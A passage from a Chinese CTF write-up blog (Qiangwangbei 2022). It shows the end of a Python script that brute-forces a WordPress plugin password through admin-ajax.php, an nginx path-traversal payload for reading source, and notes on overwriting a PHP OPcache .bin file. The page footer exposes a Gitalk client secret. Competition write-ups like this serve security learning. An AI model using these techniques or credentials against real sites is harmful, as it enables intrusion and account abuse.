<span class="built_in">print</span>(tmp)</span><br><span class="line">        paramsPost[<span class="string">&#x27;filepath&#x27;</span>]= tmp</span><br><span class="line">        response = session.post(<span class="string">&quot;http://eci-2ze4dm8xhkfttv7n5leh.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php&quot;</span>, data=paramsPost, headers=headers, cookies=cookies).text</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;umRemoveFile&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">            password += y</span><br><span class="line">            <span class="built_in">print</span>(password)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<h1 id="uploadpro"><a href="#uploadpro" class="headerlink" title="uploadpro"></a>uploadpro</h1><p>这个题目出去吃饭了,没时间做了~~呜呜呜.</p>
<p>首先是一个nginx的解析漏洞,可以拿到源码<code>uploads../proc/self/proc/self/cwd/var/www/html/index.php</code>.然后就是读取<code>index.php.bin</code>的一个问题,具体需要解析的就在于需要修改时间戳和<code>systemid</code>.其他的无需要修改,还有一个关注点在于</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">需要覆盖的应该是phpinfo.php.bin,并且要保证这个文件是没有被访问过的.切记!</span><br></pre></td></tr></table></figure>

<p><img src="https://img.dem0dem0.top//images/image-20220801114406819.png" alt="image-20220801114406819"></p>
<p><img src="https://img.dem0dem0.top//images/image-20220801114415763.png" alt="image-20220801114415763"></p>
<p>虽然这个题目没有做出来,但是还是很开心,美食很不错.上图!</p>
<p><img src="https://img.dem0dem0.top//images/image-20220801114550948.png" alt="image-20220801114550948"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://dem0dem0.top">Dem0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dem0dem0.top/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2022%E5%8F%82%E8%B5%9B%E7%BA%AA%E5%AE%9E/">https://dem0dem0.top/2022/08/01/强网杯2022参赛纪实/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://dem0dem0.top" target="_blank">Dem0のblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF%E5%A4%8D%E7%8E%B0/">CTF复现</a></div><div class="post_share"><div class="social-share" data-image="https://img.dem0dem0.top//images/51bbfbfa6f0edf4137e939c7fa520391.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/"><img class="next-cover" src="/img/conver3.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">GoogleCTF2022复现</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022复现"><img class="cover" src="/img/conver3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-20</div><div class="title">GoogleCTF2022复现</div></div></a></div><div><a href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="某ciscn分区两个题解"><img class="cover" src="/img/conver3.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-22</div><div class="title">某ciscn分区两个题解</div></div></a></div><div><a href="/2022/05/30/mrctf2022java%E9%A2%98%E8%A7%A3/" title="MRCTF-java部分"><img class="cover" src="/img/cover5.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-30</div><div class="title">MRCTF-java部分</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=79475432&amp;s=640" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dem0</div><div class="author-info__description">一个什么都想学的web🐕</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/3em0"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/atom.xml" target="_blank" title="RSS链接"><i class="fa fa-rss"></i></a><a class="social-icon" href="https://github.com/3em0" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=79475432&amp;website=www.oicqzone.com" target="_blank" title="Github"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Misfortune meets love; Maintain love for network security;</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#crash"><span class="toc-number">1.</span> <span class="toc-text">crash</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyweb"><span class="toc-number">2.</span> <span class="toc-text">babyweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easylogin"><span class="toc-number">3.</span> <span class="toc-text">easylogin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyweb"><span class="toc-number">4.</span> <span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCEFILE"><span class="toc-number">5.</span> <span class="toc-text">RCEFILE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WP-UM"><span class="toc-number">6.</span> <span class="toc-text">WP-UM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#uploadpro"><span class="toc-number">7.</span> <span class="toc-text">uploadpro</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2022%E5%8F%82%E8%B5%9B%E7%BA%AA%E5%AE%9E/" title="强网杯2022参赛纪实"><img src="https://img.dem0dem0.top//images/51bbfbfa6f0edf4137e939c7fa520391.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="强网杯2022参赛纪实"/></a><div class="content"><a class="title" href="/2022/08/01/%E5%BC%BA%E7%BD%91%E6%9D%AF2022%E5%8F%82%E8%B5%9B%E7%BA%AA%E5%AE%9E/" title="强网杯2022参赛纪实">强网杯2022参赛纪实</a><time datetime="2022-08-01T02:56:42.000Z" title="发表于 2022-08-01 10:56:42">2022-08-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022复现"><img src="/img/conver3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GoogleCTF2022复现"/></a><div class="content"><a class="title" href="/2022/07/20/GoogleCTF2022%E5%A4%8D%E7%8E%B0/" title="GoogleCTF2022复现">GoogleCTF2022复现</a><time datetime="2022-07-20T11:38:09.000Z" title="发表于 2022-07-20 19:38:09">2022-07-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVA内存马攻击篇"><img src="/img/cover4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JAVA内存马攻击篇"/></a><div class="content"><a class="title" href="/2022/07/18/JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E6%94%BB%E5%87%BB%E7%AF%87/" title="JAVA内存马攻击篇">JAVA内存马攻击篇</a><time datetime="2022-07-17T16:10:18.000Z" title="发表于 2022-07-18 00:10:18">2022-07-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/" title="XXE备忘录"><img src="/img/cover5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE备忘录"/></a><div class="content"><a class="title" href="/2022/07/08/XXE%E5%A4%87%E5%BF%98%E5%BD%95/" title="XXE备忘录">XXE备忘录</a><time datetime="2022-07-08T02:54:17.000Z" title="发表于 2022-07-08 10:54:17">2022-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="某ciscn分区两个题解"><img src="/img/conver3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某ciscn分区两个题解"/></a><div class="content"><a class="title" href="/2022/06/22/%E6%9F%90ciscn%E5%88%86%E5%8C%BA%E4%B8%A4%E4%B8%AA%E9%A2%98%E8%A7%A3/" title="某ciscn分区两个题解">某ciscn分区两个题解</a><time datetime="2022-06-21T23:53:58.000Z" title="发表于 2022-06-22 07:53:58">2022-06-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By Dem0</div><div class="footer_custom_text">努力不一定能实现梦想，但是曾经努力过的事实却足以安慰自己</br><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://cloud.tencent.com/"><img src="https://img.shields.io/badge/cdn-Tencent-orange" title="本站使用 Tencent 为静态资源提供CDN加速" alt="Tencent"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/3em0"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: 'c752b82ba7eb272e07ff',
      clientSecret: '2032517bf35f44c10890d7bd2d1daf1dc35ce43e',
      repo: '3em0.github.io',
      owner: '3em0',
      admin: ['3em0'],
      id: '64915467a0b8d2dc5436e2c12f5f8834',
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !true) {
  if (true) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>